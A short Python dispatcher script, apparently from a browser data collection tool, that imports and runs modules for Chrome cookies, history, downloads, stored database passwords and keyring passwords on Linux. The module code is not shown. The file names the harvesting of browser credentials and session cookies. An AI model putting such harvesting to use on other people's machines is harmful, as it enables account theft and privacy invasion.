#!/usr/local/bin/python
# coding: utf-8

from modules.linux.chrome import cookie, history, download, db_password, keyring_password

modules = [
		cookie.ChromeCookie,
		history.ChromeHistory,
		download.ChromeDownload,
		db_password.ChromeDbPassword,
		keyring_password.ChromeKeyringPassword,
	]


def execute():
	for module in modules:
		module()
